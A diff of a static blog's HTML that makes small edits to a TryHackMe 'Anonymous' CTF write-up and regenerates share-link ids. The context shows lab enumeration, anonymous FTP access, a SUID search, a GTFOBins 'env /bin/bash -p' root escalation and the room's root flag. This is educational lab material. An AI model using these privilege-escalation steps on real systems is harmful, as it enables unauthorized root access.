@@ -92,7 +92,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Room-Anonymous-Not-the-hacking-group-wink"><a href="#Room-Anonymous-Not-the-hacking-group-wink" class="headerlink" title="Room: Anonymous (Not the hacking group) :wink:"></a>Room: <a href="https://tryhackme.com/room/anonymous" target="_blank" rel="noopener">Anonymous</a> (<em>Not the hacking group</em>) :wink:</h1><h2 id="Basic-Enum"><a href="#Basic-Enum" class="headerlink" title="Basic Enum"></a>Basic Enum</h2><p>Nmap / rustcan</p>
+        <h1 id="Room-Anonymous-Not-the-hacking-group"><a href="#Room-Anonymous-Not-the-hacking-group" class="headerlink" title="Room: Anonymous (Not the hacking group)"></a>Room: <a href="https://tryhackme.com/room/anonymous" target="_blank" rel="noopener">Anonymous</a> (<em>Not the hacking group</em>)</h1><h2 id="Basic-Enum"><a href="#Basic-Enum" class="headerlink" title="Basic Enum"></a>Basic Enum</h2><p>Nmap / rustcan</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">IP=VICTIM</span><br><span class="line">rustscan <span class="_">-a</span> <span class="variable">$IP</span> | tee rustscan.log</span><br><span class="line">[...]</span><br><span class="line">PORT    STATE SERVICE      REASON</span><br><span class="line">21/tcp  open  ftp          syn-ack ttl 63</span><br><span class="line">22/tcp  open  ssh          syn-ack ttl 63</span><br><span class="line">139/tcp open  netbios-ssn  syn-ack ttl 63</span><br><span class="line">445/tcp open  microsoft-ds syn-ack ttl 63</span><br></pre></td></tr></table></figure>
 <ul>
 <li><p>Enumerate the machine.  How many ports are open?<br><strong>4</strong></p>
@@ -107,7 +107,7 @@
 <li>There’s a share on the user’s computer. What’s it called?<br><strong>pics</strong></li>
 </ul>
 <blockquote>
-<p>HINT: What’s that log file doing there?… nc won’t work the way you’d expect it to</p>
+<p>HINT: What’s that log file doing there?… nc won’t work the way you’d expect it to!</p>
 </blockquote>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ftp <span class="variable">$IP</span></span><br><span class="line"></span><br><span class="line">Name: anonymous</span><br><span class="line">Password: (without any password)</span><br><span class="line">ftp&gt; ls</span><br><span class="line">drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> scripts</span><br><span class="line">ftp&gt; ls</span><br><span class="line">-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh</span><br><span class="line">-rw-rw-r--    1 1000     1000         1376 Mar 05 22:23 removed_files.log</span><br><span class="line">-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line"></span><br><span class="line">ftp&gt; mget *</span><br></pre></td></tr></table></figure>
 <p>Let’s cat each files: </p>
@@ -125,7 +125,7 @@
 </blockquote>
 <p>Indeed:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s 2&gt;/dev/null</span><br><span class="line">[...]</span><br><span class="line">/usr/bin/env</span><br></pre></td></tr></table></figure>
-<p>So let’s try this: <a href="https://gtfobins.github.io/gtfobins/env/#shell" target="_blank" rel="noopener">gtfobins break out from restricted environments</a> :point_left:</p>
+<p>So let’s try this: <a href="https://gtfobins.github.io/gtfobins/env/#shell" target="_blank" rel="noopener">gtfobins break out from restricted environments</a> </p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">env /bin/bash -p</span><br><span class="line">bash-4.4<span class="comment"># id</span></span><br><span class="line">uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)</span><br><span class="line">cat /root/root.txt</span><br><span class="line">4d930091[Redacted]f27999af363</span><br><span class="line">bash-4.4<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 <p>Houra :partying_face:</p>
 <details><br>  <summary>Click to reveal the root flag!</summary><br><br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4d930091c31a622a7ed10f27999af363</span><br></pre></td></tr></table></figure><br><br></details>
@@ -138,7 +138,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://91.208.181.214/2022/03/06/TryHackMe-Anonymous-Write-Up/" data-id="cl0fcwzru0009hriy5lbk3nfq" class="article-share-link">Partager</a>
+      <a data-url="http://91.208.181.214/2022/03/06/TryHackMe-Anonymous-Write-Up/" data-id="cl0fd008u0009qniyu4cjs8t2" class="article-share-link">Partager</a>
       
       
       
@@ -215,7 +215,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://91.208.181.214/2021/11/05/TryHackMe-CMesS-CTF-Write-Up/" data-id="cl0fcwzub0038hriy1wmmf9jy" class="article-share-link">Partager</a>
+      <a data-url="http://91.208.181.214/2021/11/05/TryHackMe-CMesS-CTF-Write-Up/" data-id="cl0fd00b60038qniytu0dcgng" class="article-share-link">Partager</a>
       
       
       
@@ -297,7 +297,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://91.208.181.214/2020/10/27/TryHackMe-Madness-CTF-Write-Up/" data-id="cl0fcwzry000ahriyokdbszyt" class="article-share-link">Partager</a>
+      <a data-url="http://91.208.181.214/2020/10/27/TryHackMe-Madness-CTF-Write-Up/" data-id="cl0fd008x000aqniybzct7c1g" class="article-share-link">Partager</a>
       
       
       
@@ -352,7 +352,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://91.208.181.214/2020/09/27/TryHackMe-Wgel-CTF-Write-Up/" data-id="cl0fcwzs2000ehriyr5nnj2lx" class="article-share-link">Partager</a>
+      <a data-url="http://91.208.181.214/2020/09/27/TryHackMe-Wgel-CTF-Write-Up/" data-id="cl0fd0092000eqniyfqzzfme4" class="article-share-link">Partager</a>
       
       
       
@@ -1465,7 +1465,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://91.208.181.214/2020/09/08/AWS-SAAC-02/" data-id="cl0fcwzvg003thriymxzw498c" class="article-share-link">Partager</a>
+      <a data-url="http://91.208.181.214/2020/09/08/AWS-SAAC-02/" data-id="cl0fd00c9003tqniy15amo8xd" class="article-share-link">Partager</a>
       
       
       
@@ -1531,7 +1531,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://91.208.181.214/2020/09/01/blocklist-IP-address-with-Varnish/" data-id="cl0fcwzs4000ghriypzabd2j9" class="article-share-link">Partager</a>
+      <a data-url="http://91.208.181.214/2020/09/01/blocklist-IP-address-with-Varnish/" data-id="cl0fd0095000gqniy4vot58wv" class="article-share-link">Partager</a>
       
       
       
@@ -1587,7 +1587,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://91.208.181.214/2020/07/22/Nginx-ModSecurity/" data-id="cl0fcwzro0005hriyzuki9nbz" class="article-share-link">Partager</a>
+      <a data-url="http://91.208.181.214/2020/07/22/Nginx-ModSecurity/" data-id="cl0fd008p0005qniyi54hhki9" class="article-share-link">Partager</a>
       
       
       
@@ -1657,7 +1657,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://91.208.181.214/2020/05/27/replication-master-master/" data-id="cl0fcwzsj000rhriya0xhox1k" class="article-share-link">Partager</a>
+      <a data-url="http://91.208.181.214/2020/05/27/replication-master-master/" data-id="cl0fd009m000rqniyqtzto8c7" class="article-share-link">Partager</a>
       
       
       
@@ -1703,7 +1703,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://91.208.181.214/2020/05/21/Ansible-quick-start/" data-id="cl0fcwzr90001hriyeleei0wa" class="article-share-link">Partager</a>
+      <a data-url="http://91.208.181.214/2020/05/21/Ansible-quick-start/" data-id="cl0fd008a0001qniyrls12dfl" class="article-share-link">Partager</a>
       
       
       
@@ -1790,7 +1790,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://91.208.181.214/2020/04/26/Elastic-Stack-Essentials/" data-id="cl0fcwzrl0004hriyumz5v34x" class="article-share-link">Partager</a>
+      <a data-url="http://91.208.181.214/2020/04/26/Elastic-Stack-Essentials/" data-id="cl0fd008m0004qniys08i97g3" class="article-share-link">Partager</a>
       
       
       
